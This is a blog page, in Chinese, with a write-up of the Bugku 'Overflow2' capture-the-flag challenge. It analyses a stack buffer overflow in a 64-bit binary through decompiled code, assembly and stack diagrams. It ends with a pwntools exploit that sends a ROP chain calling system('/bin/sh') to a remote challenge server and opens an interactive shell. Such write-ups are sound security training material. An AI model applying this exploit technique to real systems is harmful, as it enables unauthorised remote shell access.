@@ -1,0 +1,335 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Bugku Overflow2 Writeups | Hakmaple&#39;s Blog</title>
+  <meta name="author" content="hakmaple">
+  
+  <meta name="description" content="检查程序
+$ file pwnpwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e9c3e8aac19e8a6dabd60d74867b72be88fa662e, for GNU/Linux 3.2.0, not stripped
+
+
+
+放入IDA中进行分析：
+int __fastcall main(int argc, const char **argv, const char **envp)&amp;#123;  _QWORD buf[4]; // [rsp+0h] [rbp-20h] BYREF  setbuf(stdin, 0);  setbuf(stdout, 0);  memset(buf, 0, sizeof(buf));  puts(&amp;quot;Please Input your name.&amp;quot;);  read(0, buf, 0x100u);  printf((const char *)&amp;#x27;@ \&amp;#x27;&amp;#x27;, (const char *)buf);  return 0;&amp;#125;
+
+在上述反汇编出的代码中，我们得知该程序分配了一个大小为20的局部栈空间用作缓冲区，接下来我们尝试阅读一下汇编代码；
+push    rbpmov     rbp, rspsub     rsp, 20hmov     rax, cs:stdin@@GLIBC_2_2_5mov     esi, 0          ; bufmov     rdi, rax        ; streamcall    _setbufmov     rax, cs:stdout@@GLIBC_2_2_5mov     esi, 0          ; bufmov     rdi, rax        ; streamcall    _setbufmov     [rbp+buf], 0mov     [rbp+var_18], 0mov     [rbp+var_10], 0mov     [rbp+var_8], 0lea     rdi, s          ; &amp;quot;Please Input your name.&amp;quot;call    _putslea     rax, [rbp+buf]mov     edx, 100h       ; nbytesmov     rsi, rax        ; bufmov     edi, 0          ; fdcall    _readlea     rax, [rbp+buf]mov     rsi, raxlea     rdi, format     ; &amp;quot;hello %s&amp;quot;mov     eax, 0call    _printfmov     eax, 0leaveretn
+
+首先是第一行push rbp，其保存了修改前的rbp，在之后的mov rbp, rsp其设置了一个新的rbp，以下是原始的栈帧
+高地址 （栈底方向，rbp 所在）+----------------------+| 调用者栈帧 ...       |+----------------------+| 保存的 rbp (8 bytes) |  &amp;lt;-- rbp 指向这里+----------------------+| 返回地址 (8 bytes)   |  &amp;lt;-- rbp + 8 （覆盖这里可以控制程序流）+----------------------+| 可能的对齐或未使用   |+----------------------+| var_8 (rbp - 8)      |  初始 0+----------------------+| var_10 (rbp - 0x10)  |  初始 0+----------------------+| var_18 (rbp - 0x18)  |  初始 0+----------------------+| buf (rbp - 0x20)     |  初始 0，read 读取的数据从这里开始存放+----------------------+  &amp;lt;-- rsp 指向这里（分配局部变量后）低地址 （栈顶方向）
+
+当程序执行后rbp被保存并设置了一个新的，那么修改后的栈布局如下：
+高地址+----------------------+| 调用者栈帧 ...       |+----------------------+| 返回地址 (8 bytes)   |  &amp;lt;-- rbp + 8+----------------------+| 保存的 rbp (8 bytes) |  &amp;lt;-- rbp 指向这里+----------------------+| var_8 (rbp - 8)      |  初始 0+----------------------+| var_10 (rbp - 0x10)  |  初始 0+----------------------+| var_18 (rbp - 0x18)  |  初始 0+----------------------+| buf (rbp - 0x20)     |  初始 0  &amp;lt;-- rsp 指向这里+----------------------+低地址"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Bugku Overflow2 Writeups"/>
+  <meta property="og:site_name" content="Hakmaple&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Hakmaple&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link href="/cat.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.3.0"><link href="https://cdn.bootcss.com/KaTeX/0.11.1/katex.min.css" rel="stylesheet" /></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Hakmaple&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Bugku Overflow2 Writeups</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p>检查程序</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ file pwn</span><br><span class="line">pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e9c3e8aac19e8a6dabd60d74867b72be88fa662e, <span class="keyword">for</span> GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure>
+
+
+
+<p>放入IDA中进行分析：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD buf[<span class="number">4</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please Input your name.&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100u</span>);</span><br><span class="line">  <span class="built_in">printf</span>((<span class="type">const</span> <span class="type">char</span> *)<span class="string">&#x27;@ \&#x27;</span><span class="string">&#x27;, (const char *)buf);</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>在上述反汇编出的代码中，我们得知该程序分配了一个大小为20的局部栈空间用作缓冲区，接下来我们尝试阅读一下汇编代码；</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, 20h</span><br><span class="line">mov     rax, cs:stdin@@GLIBC_2_2_5</span><br><span class="line">mov     esi, 0          ; buf</span><br><span class="line">mov     rdi, rax        ; stream</span><br><span class="line">call    _setbuf</span><br><span class="line">mov     rax, cs:stdout@@GLIBC_2_2_5</span><br><span class="line">mov     esi, 0          ; buf</span><br><span class="line">mov     rdi, rax        ; stream</span><br><span class="line">call    _setbuf</span><br><span class="line">mov     [rbp+buf], 0</span><br><span class="line">mov     [rbp+var_18], 0</span><br><span class="line">mov     [rbp+var_10], 0</span><br><span class="line">mov     [rbp+var_8], 0</span><br><span class="line">lea     rdi, s          ; &quot;Please Input your name.&quot;</span><br><span class="line">call    _puts</span><br><span class="line">lea     rax, [rbp+buf]</span><br><span class="line">mov     edx, 100h       ; nbytes</span><br><span class="line">mov     rsi, rax        ; buf</span><br><span class="line">mov     edi, 0          ; fd</span><br><span class="line">call    _read</span><br><span class="line">lea     rax, [rbp+buf]</span><br><span class="line">mov     rsi, rax</span><br><span class="line">lea     rdi, format     ; &quot;hello %s&quot;</span><br><span class="line">mov     eax, 0</span><br><span class="line">call    _printf</span><br><span class="line">mov     eax, 0</span><br><span class="line">leave</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
+
+<p>首先是第一行<code>push rbp</code>，其保存了修改前的<code>rbp</code>，在之后的<code>mov rbp, rsp</code>其设置了一个新的<code>rbp</code>，以下是原始的栈帧</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">高地址 （栈底方向，rbp 所在）</span><br><span class="line">+----------------------+</span><br><span class="line">| 调用者栈帧 ...       |</span><br><span class="line">+----------------------+</span><br><span class="line">| 保存的 rbp (8 bytes) |  &lt;-- rbp 指向这里</span><br><span class="line">+----------------------+</span><br><span class="line">| 返回地址 (8 bytes)   |  &lt;-- rbp + 8 （覆盖这里可以控制程序流）</span><br><span class="line">+----------------------+</span><br><span class="line">| 可能的对齐或未使用   |</span><br><span class="line">+----------------------+</span><br><span class="line">| var_8 (rbp - 8)      |  初始 0</span><br><span class="line">+----------------------+</span><br><span class="line">| var_10 (rbp - 0x10)  |  初始 0</span><br><span class="line">+----------------------+</span><br><span class="line">| var_18 (rbp - 0x18)  |  初始 0</span><br><span class="line">+----------------------+</span><br><span class="line">| buf (rbp - 0x20)     |  初始 0，read 读取的数据从这里开始存放</span><br><span class="line">+----------------------+  &lt;-- rsp 指向这里（分配局部变量后）</span><br><span class="line">低地址 （栈顶方向）</span><br></pre></td></tr></table></figure>
+
+<p>当程序执行后<code>rbp</code>被保存并设置了一个新的，那么修改后的栈布局如下：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">高地址</span><br><span class="line">+----------------------+</span><br><span class="line">| 调用者栈帧 ...       |</span><br><span class="line">+----------------------+</span><br><span class="line">| 返回地址 (8 bytes)   |  &lt;-- rbp + 8</span><br><span class="line">+----------------------+</span><br><span class="line">| 保存的 rbp (8 bytes) |  &lt;-- rbp 指向这里</span><br><span class="line">+----------------------+</span><br><span class="line">| var_8 (rbp - 8)      |  初始 0</span><br><span class="line">+----------------------+</span><br><span class="line">| var_10 (rbp - 0x10)  |  初始 0</span><br><span class="line">+----------------------+</span><br><span class="line">| var_18 (rbp - 0x18)  |  初始 0</span><br><span class="line">+----------------------+</span><br><span class="line">| buf (rbp - 0x20)     |  初始 0  &lt;-- rsp 指向这里</span><br><span class="line">+----------------------+</span><br><span class="line">低地址</span><br></pre></td></tr></table></figure>
+
+<p>由于我们的返回地址应该还包括保存的<code>rbp</code>地址（8字节），而修改后的rbp到返回地址的偏移量是32，于是最终的偏移量有两种写法：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span> + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span> + p64(<span class="number">1</span>) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)</span><br></pre></td></tr></table></figure>
+
+<p>我们在gdb中进行验证</p>
+<p><img src="/./images/bugku-overflow2/2.png" alt="images"></p>
+<p>之后继续在IDA中分析；</p>
+<p><img src="/./images/bugku-overflow2/1.png" alt="images"></p>
+<p><img src="/./images/bugku-overflow2/3.png" alt="images"></p>
+<p>跟进后发现其可以调用<code>/bin/sh</code>，因此我们得出一个思路：当我们溢出到system时其自动调用<code>/bin/sh</code></p>
+<p>Exp如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn2&#x27;)</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;117.72.52.127&#x27;</span>, <span class="number">12677</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Please Input your name&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x40126b</span></span><br><span class="line">system_addr = <span class="number">0x401050</span></span><br><span class="line">binsh_addr = <span class="number">0x402004</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span> + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2025/09/24/bugku-overflow-wp/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2025-09-24 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Pwn/">Pwn<span>4</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/Pwn/">Pwn<span>4</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 hakmaple's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
